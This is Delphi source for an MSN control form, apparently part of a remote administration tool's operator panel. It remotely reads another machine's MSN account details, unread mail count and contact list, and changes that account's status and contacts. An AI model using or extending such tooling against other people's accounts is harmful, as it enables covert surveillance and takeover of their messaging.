unit UnitMSN;

interface

uses
  StrUtils,Windows, Messages, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UnitMain, ExtCtrls, StdCtrls, ComCtrls, Menus, UnitConexao, sSkinProvider;

type
  TFormMSN = class(TForm)
    PopupMenu1: TPopupMenu;
    Atualizar1: TMenuItem;
    N1: TMenuItem;
    Bloquear1: TMenuItem;
    Desbloquear1: TMenuItem;
    N2: TMenuItem;
    Excluir1: TMenuItem;
    Adicionar1: TMenuItem;
    N3: TMenuItem;
    Salvar1: TMenuItem;
    SaveDialog1: TSaveDialog;
    ComboBoxEx1: TComboBoxEx;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    StatusBar1: TStatusBar;
    bsSkinPanel1: TPanel;
    AdvListView1: TListView;
    bsSkinPanel2: TPanel;
    AdvListView2: TListView;
    sSkinProvider1: TsSkinProvider;
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormShow(Sender: TObject);
    procedure ComboBoxEx1Select(Sender: TObject);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure Atualizar1Click(Sender: TObject);
    procedure Adicionar1Click(Sender: TObject);
    procedure Excluir1Click(Sender: TObject);
    procedure Bloquear1Click(Sender: TObject);
    procedure Desbloquear1Click(Sender: TObject);
    procedure Salvar1Click(Sender: TObject);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    NomePC: string;
    LastStatus: integer;
    PossoEnviar: boolean;
    LiberarForm: boolean;
  	procedure WMCloseFree(var Message: TMessage); message WM_CLOSEFREE;
    procedure AtualizarIdioma;
  	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
    procedure CreateParams(var Params : TCreateParams); override;
  public
    { Public declarations }
    procedure OnRead(Recebido: String; ConAux: TConexaoNew); overload;
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

var
  FormMSN: TFormMSN;

implementation

{$R *.dfm}

uses
  CustomIniFiles,
  UnitStrings,
  UnitFuncoesDiversas,
  SysUtils,
  UnitConstantes;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormMSN.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdioma;
end;  

procedure TFormMSN.WMCloseFree(var Message: TMessage);
begin
  LiberarForm := True;
  Close;
end;

//Here's the implementation of CreateParams
procedure TFormMSN.CreateParams(var Params : TCreateParams);
begin
  inherited CreateParams(Params); //Don't ever forget to do this!!!
  if FormMain.ControlCenter = True then Exit;
  Params.WndParent := GetDesktopWindow;
end;

procedure TFormMSN.Adicionar1Click(Sender: TObject);
var
  name: string;
begin
  if inputquery(pwidechar(traduzidos[555]), pwidechar(traduzidos[556]) + #13#10 + '(Ex.: test@hotmail.com)', name) then
  begin
    if name <> '' then
    begin
      Servidor.enviarString(MSNADDCONTACT + '|' + name);
      StatusBar1.Panels.Items[0].Text := traduzidos[205];
    end;
  end;
end;

procedure TFormMSN.Atualizar1Click(Sender: TObject);
begin
  Servidor.enviarString(MSNCONTACTLIST + '|');
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormMSN.AtualizarIdioma;
begin
  Label1.Caption := Traduzidos[535] + ':';
  Label2.Caption := Traduzidos[536] + ':';
  Label3.Caption := Traduzidos[537] + ' (' + IntToStr(AdvListView2.Items.Count) + '):';
  AdvListView1.Column[0].Caption := Traduzidos[538];
  AdvListView1.Column[1].Caption := Traduzidos[539];
  AdvListView2.Column[0].Caption := Traduzidos[540];
  AdvListView2.Column[1].Caption := Traduzidos[541];
  ComboBoxEx1.ItemsEx.Items[0].Caption := Traduzidos[542];
  ComboBoxEx1.ItemsEx.Items[1].Caption := Traduzidos[543];
  ComboBoxEx1.ItemsEx.Items[2].Caption := Traduzidos[544];
  ComboBoxEx1.ItemsEx.Items[3].Caption := Traduzidos[545];
  ComboBoxEx1.ItemsEx.Items[4].Caption := Traduzidos[546];
  Adicionar1.Caption := Traduzidos[555];
  AdvListView2.Column[2].Caption := Traduzidos[561];
  Atualizar1.Caption := Traduzidos[192];
  Excluir1.Caption := Traduzidos[287];
  Bloquear1.Caption := Traduzidos[454];
  Desbloquear1.Caption := Traduzidos[455];
  Salvar1.Caption := Traduzidos[387] + ' (*.txt)';
end;

procedure TFormMSN.Bloquear1Click(Sender: TObject);
var
  i: integer;
begin
  for I := 0 to AdvListView2.Items.Count - 1 do
  begin
    if AdvListView2.Items.Item[i].Selected then
    Servidor.enviarString(MSNBLOCKCONTACT + '|' + AdvListView2.Items.Item[i].Caption);
    Application.ProcessMessages;
    sleep(5);
  end;
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormMSN.ComboBoxEx1Select(Sender: TObject);
begin
  if PossoEnviar = False then exit;
  if ComboBoxEx1.ItemIndex <> LastStatus then
  Servidor.enviarString(SETMSNSTATUS + '|' + IntToStr(ComboBoxEx1.ItemIndex));
  LastStatus := ComboBoxEx1.ItemIndex;
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
  AdvListView1.SetFocus;
end;

constructor TFormMSN.Create(aOwner: TComponent; ConAux: TConexaoNew);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  inherited Create(aOwner);
  Servidor := ConAux;
  NomePC := Servidor.NomeDoServidor;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    Width := IniFile.ReadInteger('MSN', 'Width', Width);
    Height := IniFile.ReadInteger('MSN', 'Height', Height);
    Left := IniFile.ReadInteger('MSN', 'Left', Left);
    Top := IniFile.ReadInteger('MSN', 'Top', Top);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;
end;

procedure TFormMSN.Desbloquear1Click(Sender: TObject);
var
  i: integer;
begin
  for I := 0 to AdvListView2.Items.Count - 1 do
  begin
    if AdvListView2.Items.Item[i].Selected then
    Servidor.enviarString(MSNUNBLOCKCONTACT + '|' + AdvListView2.Items.Item[i].Caption);
    Application.ProcessMessages;
    sleep(5);
  end;
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormMSN.Excluir1Click(Sender: TObject);
var
  i: integer;
begin
  for I := 0 to AdvListView2.Items.Count - 1 do
  begin
    if AdvListView2.Items.Item[i].Selected then
    Servidor.enviarString(MSNDELCONTACT + '|' + AdvListView2.Items.Item[i].Caption);
    Application.ProcessMessages;
    sleep(5);
  end;
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormMSN.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  if LiberarForm then Action := caFree;

  AdvListView1.Items.Clear;
  AdvListView2.Items.Clear;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    IniFile.WriteInteger('MSN', 'Width', Width);
    IniFile.WriteInteger('MSN', 'Height', Height);
    IniFile.WriteInteger('MSN', 'Left', Left);
    IniFile.WriteInteger('MSN', 'Top', Top);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

  if Servidor <> nil then
  if Servidor.MasterIdentification = 1234567890 then Servidor.enviarString(EXITMSN + '|');
end;

procedure TFormMSN.FormCreate(Sender: TObject);
var
  i: integer;
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
  if AdvListView2.Items.Count > 0 then AdvListView2.Items.Clear;
end;

procedure TFormMSN.FormShow(Sender: TObject);
begin
  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
  if AdvListView2.Items.Count > 0 then AdvListView2.Items.Clear;
  AtualizarIdioma;

  Servidor.enviarString(GETMSNSTATUS + '|');
  StatusBar1.Panels.Items[0].Text := traduzidos[205];

  PossoEnviar := False;
  ComboBoxEx1.ItemIndex := 4;
  LastStatus := ComboBoxEx1.ItemIndex;
  ComboBoxEx1.Enabled := False;
  PossoEnviar := True;
end;

procedure TFormMSN.OnRead(Recebido: String; ConAux: TConexaoNew);
var
  Item: TListItem;
  SName, FName, Status, Blocked, TempStr: string;
  i: integer;
begin
  if Copy(Recebido, 1, posex('|', recebido) - 1) = GETMSNSTATUS then
  begin
    delete(recebido, 1, posex('|', recebido));
    if StrToInt(Recebido) = 5 then
    begin
      PossoEnviar := False;
      ComboBoxEx1.ItemIndex := 4;
      ComboBoxEx1.Enabled := False;
      StatusBar1.Panels.Items[0].Text := Traduzidos[560];
      PossoEnviar := True;
      exit;
    end;

    PossoEnviar := False;
    ComboBoxEx1.ItemIndex := StrToInt(Recebido);
    if ComboBoxEx1.ItemIndex <> 4 then
    begin
      ComboBoxEx1.Enabled := True;
    end else ComboBoxEx1.Enabled := False;
    LastStatus := ComboBoxEx1.ItemIndex;
    PossoEnviar := True;

    StatusBar1.Panels.Items[0].Text := Label1.Caption + ' ' + ComboBoxEx1.ItemsEx.Items[ComboBoxEx1.ItemIndex].Caption;
  end else

  if Copy(Recebido, 1, posex('|', recebido) - 1) = SETMSNSTATUS then
  begin
    delete(recebido, 1, posex('|', recebido));
    PossoEnviar := False;
    if StrToInt(Recebido) <> ComboBoxEx1.ItemIndex then ComboBoxEx1.ItemIndex := StrToInt(Recebido);
    StatusBar1.Panels.Items[0].Text := Label1.Caption + ' ' + ComboBoxEx1.ItemsEx.Items[ComboBoxEx1.ItemIndex].Caption;
    LastStatus := ComboBoxEx1.ItemIndex;
    PossoEnviar := True;
  end else

  if Copy(Recebido, 1, posex('|', recebido) - 1) = MSNINFO then
  begin
    delete(recebido, 1, posex('|', recebido));
    if AdvListView1.Items.Count > 0 then AdvListview1.Items.Clear;

    Item := AdvListview1.Items.Add;
    Item.ImageIndex := -1;
    Item.Caption := Traduzidos[548]; //friendlyname
    Item.SubItems.Add(Copy(recebido, 1, posex(delimitadorComandos, recebido) - 1));
    delete(recebido, 1, posex(delimitadorComandos, recebido) - 1);
    delete(recebido, 1, length(delimitadorComandos));

    Item := AdvListview1.Items.Add;
    Item.ImageIndex := -1;
    Item.Caption := Traduzidos[549]; //SignInName
    Item.SubItems.Add(Copy(recebido, 1, posex(delimitadorComandos, recebido) - 1));
    delete(recebido, 1, posex(delimitadorComandos, recebido) - 1);
    delete(recebido, 1, length(delimitadorComandos));

    Item := AdvListview1.Items.Add;
    Item.ImageIndex := -1;
    Item.Caption := Traduzidos[550]; //Servicename
    Item.SubItems.Add(Copy(recebido, 1, posex(delimitadorComandos, recebido) - 1));
    delete(recebido, 1, posex(delimitadorComandos, recebido) - 1);
    delete(recebido, 1, length(delimitadorComandos));

    Item := AdvListview1.Items.Add;
    Item.ImageIndex := -1;
    Item.Caption := Traduzidos[551]; //Emails não lidos
    Item.SubItems.Add(Copy(recebido, 1, posex(delimitadorComandos, recebido) - 1));
    delete(recebido, 1, posex(delimitadorComandos, recebido) - 1);
    delete(recebido, 1, length(delimitadorComandos));

    Item := AdvListview1.Items.Add;
    Item.ImageIndex := -1;
    Item.Caption := Traduzidos[552]; //Pasta de downloads
    Item.SubItems.Add(Copy(recebido, 1, posex(delimitadorComandos, recebido) - 1));
    delete(recebido, 1, posex(delimitadorComandos, recebido) - 1);
    delete(recebido, 1, length(delimitadorComandos));
  end else

  if Copy(Recebido, 1, posex('|', recebido) - 1) = MSNCONTACTLIST then
  begin
    delete(recebido, 1, posex('|', recebido));
    AdvListView2.Items.BeginUpdate;
    if AdvListView2.Items.Count > 0 then AdvListView2.Items.Clear;
    while recebido <> '' do
    begin
      TempStr := Copy(recebido, 1, posex(#13#10, recebido) - 1);
      delete(recebido, 1, posex(#13#10, recebido) + 1);

      SName := Copy(TempStr, 1, posex(delimitadorComandos, TempStr) - 1);
      delete(TempStr, 1, posex(delimitadorComandos, TempStr) - 1);
      delete(TempStr, 1, length(delimitadorComandos));

      FName := Copy(TempStr, 1, posex(delimitadorComandos, TempStr) - 1);
      delete(TempStr, 1, posex(delimitadorComandos, TempStr) - 1);
      delete(TempStr, 1, length(delimitadorComandos));

      Status := Copy(TempStr, 1, posex(delimitadorComandos, TempStr) - 1);
      delete(TempStr, 1, posex(delimitadorComandos, TempStr) - 1);
      delete(TempStr, 1, length(delimitadorComandos));

      Blocked := Copy(TempStr, 1, posex(delimitadorComandos, TempStr) - 1);

      Item := AdvListview2.Items.Add;
      Item.ImageIndex := 86;

      if Status = 'Offline' then Item.ImageIndex := 86 else
      if Status = 'Online' then Item.ImageIndex := 83 else
      if Status = 'Busy' then Item.ImageIndex := 85 else
      if (Status = 'Be Right Back') or
         (Status = 'Away') or
         (Status = 'On The Phone') or
         (Status = 'Out To Lunch') then Item.ImageIndex := 84;
      Item.Caption := SName;
      Item.SubItems.Add(FName);
      if Blocked = '1' then Item.SubItems.Add(traduzidos[95]) else Item.SubItems.Add(traduzidos[96])
    end;

    AdvListView2.Items.EndUpdate;
    StatusBar1.Panels.Items[0].Text := traduzidos[553];
    Label3.Caption := Traduzidos[537] + ' (' + IntToStr(AdvListView2.Items.Count) + '):';
  end else

  if Copy(Recebido, 1, posex('|', recebido) - 1) = MSNADDCONTACT then
  begin
    delete(recebido, 1, posex('|', recebido));
    StatusBar1.Panels.Items[0].Text := traduzidos[554] + ': ' + Recebido;
  end else

  if Copy(Recebido, 1, posex('|', recebido) - 1) = MSNDELCONTACT then
  begin
    delete(recebido, 1, posex('|', recebido));
    StatusBar1.Panels.Items[0].Text := traduzidos[557] + ': ' + Recebido;
  end else

  if Copy(Recebido, 1, posex('|', recebido) - 1) = MSNBLOCKCONTACT then
  begin
    delete(recebido, 1, posex('|', recebido));
    StatusBar1.Panels.Items[0].Text := traduzidos[558] + ': ' + Recebido;
  end else

  if Copy(Recebido, 1, posex('|', recebido) - 1) = MSNUNBLOCKCONTACT then
  begin
    delete(recebido, 1, posex('|', recebido));
    StatusBar1.Panels.Items[0].Text := traduzidos[559] + ': ' + Recebido;
  end else

end;

procedure TFormMSN.PopupMenu1Popup(Sender: TObject);
var
  i: integer;
begin
  // Até encontrar uma maneira de usar essas funções no MSN novo...
  for I := 0 to Popupmenu1.Items.Count - 1 do
  Popupmenu1.Items.Items[i].Enabled := (ComboBoxEx1.Enabled) or (AdvListView2.SelCount > 0);

  for I := 1 to Popupmenu1.Items.Count - 2 do
  Popupmenu1.Items.Items[i].Visible := False;
  exit;
  /////////////////////////////////////////////////////////////////









  for I := 0 to Popupmenu1.Items.Count - 1 do
  Popupmenu1.Items.Items[i].Enabled := (ComboBoxEx1.Enabled) or (AdvListView2.SelCount > 0);
  if (ComboBoxEx1.Enabled) and (AdvListView2.SelCount > 0) then Exit;

  for I := 0 to Popupmenu1.Items.Count - 1 do
  Popupmenu1.Items.Items[i].Enabled := False;

  if (AdvListView2.SelCount <= 0) and (ComboBoxEx1.Enabled) then
  begin
    for I := 0 to Popupmenu1.Items.Count - 1 do
    Popupmenu1.Items.Items[i].Enabled := False;
    Atualizar1.Enabled := True;
    Adicionar1.Enabled := True;
    if AdvListView2.Items.Count > 0 then Salvar1.Enabled := True;
    exit;
  end;

  if AdvListView2.Items.Count > 0 then
  begin
    Salvar1.Enabled := True;
    Atualizar1.Enabled := True;
    Adicionar1.Enabled := True;
  end;
end;

procedure TFormMSN.Salvar1Click(Sender: TObject);
var
  Filename: string;
  I: Integer;
  buffer: string;
  Distancia: integer;
begin
  if savedialog1 <> nil then savedialog1.Free;
  savedialog1 := Tsavedialog.Create(nil);
  savedialog1.Filter := 'Text Files (*.txt)' + '|*.txt';
  savedialog1.InitialDir := extractfilepath(paramstr(0));
  savedialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
  SaveDialog1.FileName := ShowTime('-', ' ', '-') + '.txt';

  if savedialog1.Execute = false then exit;

  Filename := savedialog1.FileName;
  if Filename = '' then exit;

  buffer := '';
  for I := 0 to AdvListView2.Items.Count - 1 do
  buffer := buffer + AdvListView2.Items.Item[i].Caption + #13#10;

  criararquivo(pwidechar(filename), pwidechar(buffer), length(buffer) * 2);
end;

end.
